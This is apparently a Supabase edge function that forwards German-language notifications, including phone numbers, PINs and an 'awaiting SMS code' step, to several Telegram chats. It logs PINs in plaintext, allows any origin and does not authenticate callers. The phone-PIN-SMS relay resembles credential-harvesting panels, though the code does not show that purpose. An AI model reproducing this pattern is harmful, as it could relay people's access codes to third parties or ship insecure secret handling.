
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.49.8';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TelegramNotificationRequest {
  phone?: string;
  accessCode?: string;
  shortId?: string;
  type?: 'request' | 'activation' | 'sms_sent' | 'completed' | 'evaluation_completed' | 'live_chat_message';
  workerName?: string;
  auftragTitle?: string;
  auftragsnummer?: string;
  message?: string;
  senderName?: string;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { phone, accessCode, shortId, type = 'request', workerName, auftragTitle, auftragsnummer, message, senderName }: TelegramNotificationRequest = await req.json();
    
    const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const supabaseUrl = Deno.env.get('SUPABASE_URL');
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');
    
    if (!botToken || !supabaseUrl || !supabaseServiceKey) {
      console.error('Missing required environment variables');
      return new Response(
        JSON.stringify({ error: 'Missing required environment variables' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Initialize Supabase client
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    // Fetch active chat IDs from database
    const { data: chatIds, error: chatError } = await supabase
      .from('telegram_chat_ids')
      .select('chat_id, name')
      .eq('is_active', true);

    if (chatError) {
      console.error('Error fetching Telegram chat IDs:', chatError);
      return new Response(
        JSON.stringify({ error: 'Failed to fetch chat IDs' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    if (!chatIds || chatIds.length === 0) {
      console.error('No active Telegram chat IDs found');
      return new Response(
        JSON.stringify({ error: 'No active chat IDs configured' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Create different messages based on type
    let telegramMessage: string;
    if (type === 'live_chat_message') {
      telegramMessage = `💬 Neue Live Chat Nachricht!\n👤 Von: ${senderName}\n📝 Nachricht: ${message}`;
    } else if (type === 'evaluation_completed') {
      telegramMessage = `📝 Auftrag bewertet!\n📋 ${auftragTitle} (${auftragsnummer})\n👤 von ${workerName} wurde erfolgreich bewertet.`;
    } else if (type === 'activation') {
      telegramMessage = `✅ Nummer Aktiviert!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}`;
      }
    } else if (type === 'sms_sent') {
      telegramMessage = `📤 SMS versendet!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}`;
      }
      telegramMessage += `\n⏳ Wartet auf SMS Code`;
    } else if (type === 'completed') {
      telegramMessage = `✅ Vorgang abgeschlossen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}`;
      }
      telegramMessage += `\n🎉 Erfolgreich beendet`;
    } else {
      telegramMessage = `🔔 Neue Anfrage eingegangen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
      if (shortId) {
        telegramMessage += `\n🆔 ID: ${shortId}\n\nZum Aktivieren: /activate ${shortId}`;
      }
    }
    
    console.log(`Sending Telegram notification (${type}) to ${chatIds.length} chat(s):`, { phone, accessCode, shortId, workerName, auftragTitle, auftragsnummer, message, senderName });
    
    let sentCount = 0;
    const results = [];

    // Send to all active chat IDs
    for (const chat of chatIds) {
      try {
        const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chat.chat_id,
            text: telegramMessage,
          }),
        });

        if (telegramResponse.ok) {
          const result = await telegramResponse.json();
          console.log(`Telegram notification (${type}) sent successfully to ${chat.name} (${chat.chat_id}):`, result);
          results.push({ chat: chat.name, success: true, result });
          sentCount++;
        } else {
          const errorText = await telegramResponse.text();
          console.error(`Telegram API error for ${chat.name} (${chat.chat_id}):`, errorText);
          results.push({ chat: chat.name, success: false, error: errorText });
        }
      } catch (error) {
        console.error(`Error sending to ${chat.name} (${chat.chat_id}):`, error);
        results.push({ chat: chat.name, success: false, error: error.message });
      }
    }

    if (sentCount === 0) {
      console.error('Failed to send notification to any chat');
      return new Response(
        JSON.stringify({ error: 'Failed to send notification to any chat', details: results }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`Telegram notification (${type}) sent to ${sentCount}/${chatIds.length} chats`);

    return new Response(
      JSON.stringify({ 
        success: true, 
        sentCount, 
        totalChats: chatIds.length, 
        results 
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('Error in send-telegram-notification function:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
